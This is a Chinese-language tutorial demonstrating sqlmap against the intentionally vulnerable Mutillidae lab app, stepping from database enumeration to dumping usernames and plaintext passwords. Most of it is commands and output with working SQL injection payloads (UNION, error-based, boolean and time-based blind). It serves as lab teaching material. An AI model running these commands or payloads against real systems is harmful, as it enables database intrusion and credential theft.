# 使用SQLmap工具注入

使用mutillidae的应用程序来做测试

0x00、第一步找到一个可注入的地址。并开始使用sqlmap注入得到数据库列表
```bash
[root@kali: ~#] sqlmap --url="http://example.com/mutillidae/index.php?page=user-info.php&username=%27or%201=1%20--%27&password=%27123456%27&user-info-php-submit-button=View+Account+Details" --dbs
#中途会询问
Are you sure you want to continue? [y/N] 
GET parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
heuristic (parsing) test showed that the back-end DBMS could be 'MySQL or PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
do you want to include all tests for 'MySQL or PostgreSQL' extending provided level (1) and risk (1)? [Y/n]
#全部都选择Y
#后面会得到这样的结果
sqlmap identified the following injection points with a total of 1412 HTTP(s) requests:
---
Place: GET
Parameter: username
    Type: UNION query
    Title: MySQL UNION query (NULL) - 5 columns
    Payload: page=user-info.php&username='or 1=1 --'' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716f707a71,0x7462766b6f7a77567076,0x7173647471),NULL#&password='123456'&user-info-php-submit-button=View Account Details

Place: GET
Parameter: password
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: page=user-info.php&username='or 1=1 --'&password=-6359' OR (6403=6403)#&user-info-php-submit-button=View Account Details

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE or HAVING clause
    Payload: page=user-info.php&username='or 1=1 --'&password=-9841' OR (SELECT 4721 FROM(SELECT COUNT(*),CONCAT(0x716f707a71,(SELECT (CASE WHEN (4721=4721) THEN 1 ELSE 0 END)),0x7173647471,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'bsvA'='bsvA&user-info-php-submit-button=View Account Details

    Type: UNION query
    Title: MySQL UNION query (random number) - 5 columns
    Payload: page=user-info.php&username='or 1=1 --'&password=-7182' UNION ALL SELECT 5335,5335,5335,CONCAT(0x716f707a71,0x4d65695551536a684763,0x7173647471),5335#&user-info-php-submit-button=View Account Details

    Type: AND/OR time-based blind
    Title: MySQL > 5.0.11 OR time-based blind
    Payload: page=user-info.php&username='or 1=1 --'&password=-6183' OR 5436=SLEEP(5) AND 'ygBn'='ygBn&user-info-php-submit-button=View Account Details
---
there were multiple injection points, please select the one to use for following injections:
[0] place: GET, parameter: username, type: Single quoted string (default)
[1] place: GET, parameter: password, type: Single quoted string
[q] Quit
#这里选择默认即可
> 0
[01:34:22] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS: MySQL 5.0
[01:34:22] [INFO] fetching database names
available databases [7]:
[*] dvwa
[*] information_schema
[*] metasploit
[*] mysql
[*] owasp10
[*] tikiwiki
[*] tikiwiki195
#这里得到了数据库列表
```

0x02、通过数据库名得到数据库表列表
```bash
[root@kali: ~#] sqlmap --url="http://example.com/mutillidae/index.php?page=user-info.php&username=%27or%201=1%20--%27&password=%27123456%27&user-info-php-submit-button=View+Account+Details" -D metasploit --tables
#中途会询问
Are you sure you want to continue? [y/N] 
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Place: GET
Parameter: username
    Type: UNION query
    Title: MySQL UNION query (NULL) - 5 columns
    Payload: page=user-info.php&username='or 1=1 --'' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716f707a71,0x7462766b6f7a77567076,0x7173647471),NULL#&password='123456'&user-info-php-submit-button=View Account Details

Place: GET
Parameter: password
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: page=user-info.php&username='or 1=1 --'&password=-6359' OR (6403=6403)#&user-info-php-submit-button=View Account Details

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE or HAVING clause
    Payload: page=user-info.php&username='or 1=1 --'&password=-9841' OR (SELECT 4721 FROM(SELECT COUNT(*),CONCAT(0x716f707a71,(SELECT (CASE WHEN (4721=4721) THEN 1 ELSE 0 END)),0x7173647471,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'bsvA'='bsvA&user-info-php-submit-button=View Account Details

    Type: UNION query
    Title: MySQL UNION query (random number) - 5 columns
    Payload: page=user-info.php&username='or 1=1 --'&password=-7182' UNION ALL SELECT 5335,5335,5335,CONCAT(0x716f707a71,0x4d65695551536a684763,0x7173647471),5335#&user-info-php-submit-button=View Account Details

    Type: AND/OR time-based blind
    Title: MySQL > 5.0.11 OR time-based blind
    Payload: page=user-info.php&username='or 1=1 --'&password=-6183' OR 5436=SLEEP(5) AND 'ygBn'='ygBn&user-info-php-submit-button=View Account Details
---
there were multiple injection points, please select the one to use for following injections:
[0] place: GET, parameter: password, type: Single quoted string (default)
[1] place: GET, parameter: username, type: Single quoted string
[q] Quit
#跟前面一样选择默认
> 0
[02:52:23] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS: MySQL 5.0
[02:52:23] [INFO] fetching tables for database: 'metasploit'
[02:52:24] [INFO] the SQL query used returns 1 entries
[02:52:25] [INFO] retrieved: "accounts"
Database: metasploit                                                                                                                                                                                                                                                         
[1 table]
+----------+
| accounts |
+----------+
#注意，这里表我的只有一个，其他表没有创建。

```
0x03、通过表名得到字段列表
```bash
[root@kali: ~#] sqlmap --url="http://example.com/mutillidae/index.php?page=user-info.php&username=%27or%201=1%20--%27&password=%27123456%27&user-info-php-submit-button=View+Account+Details" -D metasploit -T accounts --columns
#会询问
Are you sure you want to continue? [y/N] 
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Place: GET
Parameter: username
    Type: UNION query
    Title: MySQL UNION query (NULL) - 5 columns
    Payload: page=user-info.php&username='or 1=1 --'' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716f707a71,0x7462766b6f7a77567076,0x7173647471),NULL#&password='123456'&user-info-php-submit-button=View Account Details

Place: GET
Parameter: password
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: page=user-info.php&username='or 1=1 --'&password=-6359' OR (6403=6403)#&user-info-php-submit-button=View Account Details

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE or HAVING clause
    Payload: page=user-info.php&username='or 1=1 --'&password=-9841' OR (SELECT 4721 FROM(SELECT COUNT(*),CONCAT(0x716f707a71,(SELECT (CASE WHEN (4721=4721) THEN 1 ELSE 0 END)),0x7173647471,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'bsvA'='bsvA&user-info-php-submit-button=View Account Details

    Type: UNION query
    Title: MySQL UNION query (random number) - 5 columns
    Payload: page=user-info.php&username='or 1=1 --'&password=-7182' UNION ALL SELECT 5335,5335,5335,CONCAT(0x716f707a71,0x4d65695551536a684763,0x7173647471),5335#&user-info-php-submit-button=View Account Details

    Type: AND/OR time-based blind
    Title: MySQL > 5.0.11 OR time-based blind
    Payload: page=user-info.php&username='or 1=1 --'&password=-6183' OR 5436=SLEEP(5) AND 'ygBn'='ygBn&user-info-php-submit-button=View Account Details
---
there were multiple injection points, please select the one to use for following injections:
[0] place: GET, parameter: password, type: Single quoted string (default)
[1] place: GET, parameter: username, type: Single quoted string
[q] Quit
#选择默认
> 0
[02:53:41] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS: MySQL 5.0
[02:53:41] [INFO] fetching columns for table 'accounts' in database 'metasploit'
[02:53:42] [INFO] the SQL query used returns 5 entries
[02:53:43] [INFO] retrieved: "cid","int(11)"
[02:53:43] [INFO] retrieved: "username","text"
[02:53:44] [INFO] retrieved: "password","text"
[02:53:45] [INFO] retrieved: "mysignature","text"
[02:53:46] [INFO] retrieved: "is_admin","varchar(5)"
Database: metasploit                                                                                                                                                                                                                                                         
Table: accounts
[5 columns]
+-------------+------------+
| Column      | Type       |
+-------------+------------+
| cid         | int(11)    |
| is_admin    | varchar(5) |
| mysignature | text       |
| password    | text       |
| username    | text       |
+-------------+------------+
```
0x04、通过字段名得到数据
```bash
[root@kali: ~#] sqlmap --url="http://example.com/mutillidae/index.php?page=user-info.php&username=%27or%201=1%20--%27&password=%27123456%27&user-info-php-submit-button=View+Account+Details" -D metasploit -T accounts -C username --dump
#跟前面一样，最后得到的
Database: metasploit
Table: accounts
[18 entries]
+----------+
| username |
+----------+
| admin    |
| adrian   |
| bobby    |
| bryce    |
| cal      |
| dave     |
| dreveil  |
| ed       |
| jeremy   |
| jim      |
| john     |
| john     |
| kevin    |
| samurai  |
| scotty   |
| simba    |
| wack     |
| wack1    |
+----------+

[root@kali: ~#] sqlmap --url="http://example.com/mutillidae/index.php?page=user-info.php&username=%27or%201=1%20--%27&password=%27123456%27&user-info-php-submit-button=View+Account+Details" -D metasploit -T accounts -C password --dump
#最后的结果
Database: metasploit
Table: accounts
[18 entries]
+--------------+
| password     |
+--------------+
| 42           |
| adminpass    |
| monkey       |
| password     |
| password     |
| password     |
| password     |
| password     |
| password     |
| password     |
| password     |
| password     |
| pentest      |
| samurai      |
| set          |
| somepassword |
| wack         |
| wack1        |
+--------------+
```
btw: 这个只是演示sqlmap的基本用法，开始一直手动注入，然后试了sqlmap，一下感觉这个玩意高大上了！！

